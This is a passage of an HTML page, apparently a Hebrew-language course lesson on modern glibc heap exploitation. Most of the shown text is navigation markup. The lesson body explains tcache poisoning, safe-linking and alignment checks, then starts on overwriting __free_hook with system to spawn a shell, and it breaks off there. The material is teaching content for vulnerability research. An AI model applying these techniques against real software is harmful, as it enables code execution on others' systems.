+    <a href="../../../5%20-%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%9E%D7%97%D7%A8%D7%95%D7%96%D7%AA%20%D7%A4%D7%95%D7%A8%D7%9E%D7%98/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string/5.1%20-%20%D7%99%D7%A1%D7%95%D7%93%D7%95%D7%AA%20format%20string%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    5   חולשות מחרוזת פורמט
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../6%20-%20ROP%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9D/6.1%20-%20stack%20pivoting/6.1%20-%20stack%20pivoting%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    6   ROP מתקדם
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_9" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_9" id="__nav_7_2_9_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7   ניצול הHeap
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="3" aria-labelledby="__nav_7_2_9_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_9">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    7   ניצול הHeap
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.1   פנימיות המקצה של glibc
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.2%20-%20%D7%A9%D7%99%D7%9E%D7%95%D7%A9%20%D7%9C%D7%90%D7%97%D7%A8%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8/7.2%20-%20%D7%A9%D7%99%D7%9E%D7%95%D7%A9%20%D7%9C%D7%90%D7%97%D7%A8%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.2   שימוש לאחר שחרור
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning/7.3%20-%20%D7%A9%D7%97%D7%A8%D7%95%D7%A8%20%D7%9B%D7%A4%D7%95%D7%9C%20%D7%95tcache%20poisoning%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.3   שחרור כפול וtcache poisoning
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.4%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%AA%20unlink/7.4%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%AA%20unlink%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.4   תקיפת unlink
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of/7.5%20-%20%D7%92%D7%9C%D7%99%D7%A9%D7%AA%20heap%20%D7%95%D7%98%D7%9B%D7%A0%D7%99%D7%A7%D7%95%D7%AA%20House%20of%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.5   גלישת heap וטכניקות House of
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+    
+    <li class="md-nav__item md-nav__item--active md-nav__item--nested">
+      
+        
+        
+        <input class="md-nav__toggle md-toggle " type="checkbox" id="__nav_7_2_9_6" checked>
+        
+          
+          <label class="md-nav__link" for="__nav_7_2_9_6" id="__nav_7_2_9_6_label" tabindex="0">
+            
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6   תקיפות tcache וfastbin מודרניות
+  
+
+    
+  </span>
+  
+  
+
+            <span class="md-nav__icon md-icon"></span>
+          </label>
+        
+        <nav class="md-nav" data-md-level="4" aria-labelledby="__nav_7_2_9_6_label" aria-expanded="true">
+          <label class="md-nav__title" for="__nav_7_2_9_6">
+            <span class="md-nav__icon md-icon"></span>
+            
+  
+    7.6   תקיפות tcache וfastbin מודרניות
+  
+
+          </label>
+          <ul class="md-nav__list" data-md-scrollfix>
+            
+              
+                
+  
+  
+    
+  
+  
+  
+    <li class="md-nav__item md-nav__item--active">
+      
+      <input class="md-nav__toggle md-toggle" type="checkbox" id="__toc">
+      
+      
+      
+        <label class="md-nav__link md-nav__link--active" for="__toc">
+          
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6 - תקיפות tcache וfastbin מודרניות - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <a href="./" class="md-nav__link md-nav__link--active">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6 - תקיפות tcache וfastbin מודרניות - הרצאה
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+      
+        
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-tcache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מאיפה מתחילים - הפרימיטיב של tcache poisoning
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-__malloc_hook-__free_hook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        העולם הישן - __malloc_hook ו__free_hook
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-glibc-234" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה השתנה - הסרת ההוקים בglibc 2.34
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-chain-rop-environ" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 1 - כתיבת chain ROP למחסנית דרך environ
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-file-vtable-fsop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 2 - תקיפת מבני FILE ושרשור vtable - FSOP
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="מטרה 2 - תקיפת מבני FILE ושרשור vtable - FSOP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-io_2_1_stdout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הleak המהירה דרך IO_2_1_stdout
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-house-of-apple2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הרצת קוד בעת יציאה - house of apple2
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-__exit_funcs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 3 - דריסת מטפלי היציאה - __exit_funcs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-large-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 4 - תקיפת large bin לכתיבה מבוקרת
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-global_max_fast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 5 - הגדלת global_max_fast
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        איך בוחרים מטרה - טבלת החלטה לפי גרסה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-tcache-poisoning-environ" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שלד exploit מלא - tcache poisoning אל environ
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%A4%D7%AA%D7%A8%D7%95%D7%9F/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6 - תקיפות tcache וfastbin מודרניות - פתרון
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../7.6%20-%20%D7%AA%D7%A7%D7%99%D7%A4%D7%95%D7%AA%20tcache%20%D7%95fastbin%20%D7%9E%D7%95%D7%93%D7%A8%D7%A0%D7%99%D7%95%D7%AA%20-%20%D7%AA%D7%A8%D7%92%D7%95%D7%9C/" class="md-nav__link">
+        
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.6 - תקיפות tcache וfastbin מודרניות - תרגול
+  
+
+    
+  </span>
+  
+  
+
+      </a>
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../7.7%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20heap%20%D7%9E%D7%9C%D7%90/7.7%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20heap%20%D7%9E%D7%9C%D7%90%20-%20%D7%A4%D7%A8%D7%95%D7%99%D7%A7%D7%98/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    7.7   פרויקט ניצול heap מלא
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../8%20-%20%D7%94%D7%A0%D7%93%D7%A1%D7%94%20%D7%94%D7%A4%D7%95%D7%9B%D7%94%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX/8.1%20-%20%D7%A7%D7%91%D7%A6%D7%99%D7%9D%20%D7%90%D7%A8%D7%95%D7%96%D7%99%D7%9D%20%D7%95-UPX%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    8   הנדסה הפוכה לניצול
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../9%20-%20%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%95%D7%90%D7%AA%D7%92%D7%A8%D7%99%D7%9D%20%D7%9E%D7%AA%D7%A7%D7%93%D7%9E%D7%99%D7%9D/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1/9.1%20-%20%D7%9E%D7%91%D7%95%D7%90%20%D7%9C%D7%A0%D7%99%D7%A6%D7%95%D7%9C%20%D7%A7%D7%A8%D7%A0%D7%9C%20%D7%9C%D7%99%D7%A0%D7%95%D7%A7%D7%A1%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    9   ניצול קרנל ואתגרים מתקדמים
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    
+  
+  
+  
+    <a href="../../../10%20-%20%D7%9E%D7%A6%D7%99%D7%90%D7%AA%20%D7%97%D7%95%D7%9C%D7%A9%D7%95%D7%AA%20%D7%90%D7%9E%D7%99%D7%AA%D7%99%D7%95%D7%AA/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8/10.1%20-%20%D7%A1%D7%A7%D7%99%D7%A8%D7%AA%20%D7%A7%D7%95%D7%93%20%D7%9E%D7%A7%D7%95%D7%A8%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    10   מציאת חולשות אמיתיות
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+              
+            
+              
+                
+  
+  
+  
+  
+    
+    
+      
+        
+          
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+        
+      
+    
+    
+    
+      
+      
+    
+    
+      
+        
+        
+      
+    
+    <li class="md-nav__item md-nav__item--pruned md-nav__item--nested">
+      
+        
+  
+  
+  
+    <a href="../../../../%D7%AA%D7%9B%D7%A0%D7%95%D7%AA-GPU/" class="md-nav__link">
+      
+  
+  
+  <span class="md-ellipsis">
+    
+  
+    תכנות GPU
+  
+
+    
+  </span>
+  
+  
+
+      
+        <span class="md-nav__icon md-icon"></span>
+      
+    </a>
+  
+
+      
+    </li>
+  
+
+              
+            
+          </ul>
+        </nav>
+      
+    </li>
+  
+
+    
+  </ul>
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+            
+              
+              <div class="md-sidebar md-sidebar--secondary" data-md-component="sidebar" data-md-type="toc" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+<nav class="md-nav md-nav--secondary" aria-label="תוכן העניינים">
+  
+  
+  
+  
+    <label class="md-nav__title" for="__toc">
+      <span class="md-nav__icon md-icon"></span>
+      תוכן העניינים
+    </label>
+    <ul class="md-nav__list" data-md-component="toc" data-md-scrollfix>
+      
+        <li class="md-nav__item">
+  <a href="#-tcache-poisoning" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מאיפה מתחילים - הפרימיטיב של tcache poisoning
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-__malloc_hook-__free_hook" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        העולם הישן - __malloc_hook ו__free_hook
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-glibc-234" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מה השתנה - הסרת ההוקים בglibc 2.34
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#1-chain-rop-environ" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 1 - כתיבת chain ROP למחסנית דרך environ
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#2-file-vtable-fsop" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 2 - תקיפת מבני FILE ושרשור vtable - FSOP
+      
+    </span>
+  </a>
+  
+    <nav class="md-nav" aria-label="מטרה 2 - תקיפת מבני FILE ושרשור vtable - FSOP">
+      <ul class="md-nav__list">
+        
+          <li class="md-nav__item">
+  <a href="#leak-io_2_1_stdout" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הleak המהירה דרך IO_2_1_stdout
+      
+    </span>
+  </a>
+  
+</li>
+        
+          <li class="md-nav__item">
+  <a href="#-house-of-apple2" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        הרצת קוד בעת יציאה - house of apple2
+      
+    </span>
+  </a>
+  
+</li>
+        
+      </ul>
+    </nav>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#3-__exit_funcs" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 3 - דריסת מטפלי היציאה - __exit_funcs
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#4-large-bin" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 4 - תקיפת large bin לכתיבה מבוקרת
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#5-global_max_fast" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        מטרה 5 - הגדלת global_max_fast
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#-" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        איך בוחרים מטרה - טבלת החלטה לפי גרסה
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#exploit-tcache-poisoning-environ" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        שלד exploit מלא - tcache poisoning אל environ
+      
+    </span>
+  </a>
+  
+</li>
+      
+        <li class="md-nav__item">
+  <a href="#_1" class="md-nav__link">
+    <span class="md-ellipsis">
+      
+        סיכום
+      
+    </span>
+  </a>
+  
+</li>
+      
+    </ul>
+  
+</nav>
+                  </div>
+                </div>
+              </div>
+            
+          
+          
+            <div class="md-content" data-md-component="content">
+              
+                
+
+
+
+  
+
+
+  <nav class="md-path" aria-label="ניווט" >
+    <ol class="md-path__list">
+      
+        
+  
+  
+    <li class="md-path__item">
+      <a href="../../../.." class="md-path__link">
+        
+  <span class="md-ellipsis">
+    דף הבית
+  </span>
+
+      </a>
+    </li>
+  
+
+      
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../../%D7%9C%D7%99%D7%91%D7%AA-%D7%94%D7%9E%D7%97%D7%A9%D7%91/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר ו-Low Level
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../../" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    מחקר חולשות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+        
+  
+  
+    
+    
+      
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="../../7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc/7.1%20-%20%D7%A4%D7%A0%D7%99%D7%9E%D7%99%D7%95%D7%AA%20%D7%94%D7%9E%D7%A7%D7%A6%D7%94%20%D7%A9%D7%9C%20glibc%20-%20%D7%94%D7%A8%D7%A6%D7%90%D7%94/" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    7   ניצול הHeap
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+    
+  
+
+      
+        
+  
+  
+    
+    
+      <li class="md-path__item">
+        <a href="./" class="md-path__link">
+          
+  <span class="md-ellipsis">
+    7.6   תקיפות tcache וfastbin מודרניות
+  </span>
+
+        </a>
+      </li>
+    
+  
+
+      
+    </ol>
+  </nav>
+
+              
+              <article class="md-content__inner md-typeset">
+                
+                  
+
+
+
+  <h1>7.6 - תקיפות tcache וfastbin מודרניות - הרצאה</h1>
+
+<p>בשיעורים הקודמים של הפרק בנינו את הפרימיטיב: ב-7.3 למדנו tcache poisoning, ב-7.4 את תקיפת ה-unlink, וב-7.5 את משפחת ה-House of. בכל אחד מהם השגנו בסוף אותו דבר יקר ערך - היכולת לגרום ל-<code>malloc</code> להחזיר מצביע לכתובת שאנחנו בוחרים, כלומר כתיבה שרירותית לזיכרון. אבל כאן מתחילה השאלה האמיתית של exploit heap מודרני: יש לי כתיבה שרירותית, על מה אני כותב כדי לקבל הרצת קוד? עד glibc 2.33 התשובה הייתה קלה וכמעט משעממת - כותבים על <code>__free_hook</code>. בגרסה 2.34 ההוקים האלה נמחקו מ-libc, ומאז כל תוקף heap חייב להכיר ארסנל של מטרות חלופיות. השיעור הזה הוא הארסנל הזה: FSOP דרך מבני FILE מזויפים, כתיבת chain ROP למחסנית דרך <code>environ</code>, דריסת מטפלי היציאה, תקיפת large bin, ו-<code>global_max_fast</code>. נלמד מה עובד על איזו גרסה, ולמה.</p>
+<h2 id="-tcache-poisoning">מאיפה מתחילים - הפרימיטיב של tcache poisoning<a class="headerlink" href="#-tcache-poisoning" title="Permanent link">&para;</a></h2>
+<p>לפני שנדבר על מטרות, בואו נגדיר במדויק מה יש לנו ביד אחרי 7.3. הפרימיטיב הבסיסי הוא זה: אם יש לנו חולשת Use-After-Free או double-free על chunk קטן, אנחנו יכולים לדרוס את שדה ה-<code>fd</code> של chunk ששוחרר ל-tcache. שני <code>malloc</code> באותו גודל אחר כך יחזירו קודם את ה-chunk המקורי ואז את הכתובת שכתבנו ב-<code>fd</code>. כלומר:</p>
+<div class="highlight"><pre><span></span><code><a id="__codelineno-0-1" name="__codelineno-0-1" href="#__codelineno-0-1"></a>tcache bin (size 0x40):
+<a id="__codelineno-0-2" name="__codelineno-0-2" href="#__codelineno-0-2"></a>head -&gt; A -&gt; [ A&#39;s fd is overwritten to address T ]
+<a id="__codelineno-0-3" name="__codelineno-0-3" href="#__codelineno-0-3"></a>malloc() first  -&gt; returns A
+<a id="__codelineno-0-4" name="__codelineno-0-4" href="#__codelineno-0-4"></a>malloc() second -&gt; returns T   (the address we chose)
+</code></pre></div>
+<p>מרגע ש-<code>malloc</code> החזיר מצביע ל-<code>T</code>, כל קריאה/כתיבה ל-chunk הזה היא קריאה/כתיבה ל-<code>T</code>. זו כתיבה שרירותית לכתובת שאנחנו שולטים בה. שימו לב לשני סייגים מודרניים שלמדנו ב-7.3 ושילוו אותנו כאן:</p>
+<ul>
+<li>החל מ-glibc 2.32 יש safe-linking: שדה ה-<code>fd</code> נשמר מעורבב, <code>fd = target XOR (chunk_addr &gt;&gt; 12)</code>. כדי לזייף אותו צריך לדעת את כתובת ה-chunk (leak heap), ואז לכתוב <code>target XOR (chunk_addr &gt;&gt; 12)</code>.</li>
+<li>החל מ-2.32 יש גם בדיקת alignment: הכתובת שמוחזרת חייבת להיות aligned ל-16 בתים, אחרת <code>malloc</code> יזרוק <code>malloc(): unaligned tcache chunk detected</code>. לכן כשבוחרים מטרה <code>T</code> צריך שתהיה aligned ל-16.</li>
+</ul>
+<p>הנחות ההגנה לכל השיעור: NX פעיל (אין הרצה מהמחסנית או ה-heap), ASLR פעיל (בסיס libc אקראי - לכן נצטרך leak), ואין canary או שאיננו נוגעים בו. מצב ה-RELRO לא ישנה לנו הרבה, כי אף אחת מהמטרות כאן איננה ה-GOT. בכל דוגמה נניח שכבר יש בידינו leak libc, כי בלי בסיס libc אף אחת מהכתובות האלה איננה ידועה.</p>
+<h2 id="-__malloc_hook-__free_hook">העולם הישן - __malloc_hook ו__free_hook<a class="headerlink" href="#-__malloc_hook-__free_hook" title="Permanent link">&para;</a></h2>
+<p>עד glibc 2.33 כללה libc שני מצביעי פונקציה גלובליים: <code>__malloc_hook</code> ו-<code>__free_hook</code>. הרעיון המקורי היה דיבוג - להחליף את התנהגות ההקצאה. אבל בשביל תוקף אלה היו המתנה המושלמת: מצביע פונקציה כתיב בכתובת ידועה ב-libc, שנקרא אוטומטית.</p>
+<p>הזהב האמיתי היה <code>__free_hook</code>, כי <code>free(ptr)</code> מבצע בפועל <code>__free_hook(ptr)</code> - כלומר קורא להוק כשה-<code>rdi</code> כבר מכיל את הארגומנט של <code>free</code>. אם נכתוב <code>__free_hook = system</code> ואז נשחרר chunk שמכיל את המחרוזת <code>"/bin/sh"</code>, נקבל <code>system("/bin/sh")</code> בחינם:</p>
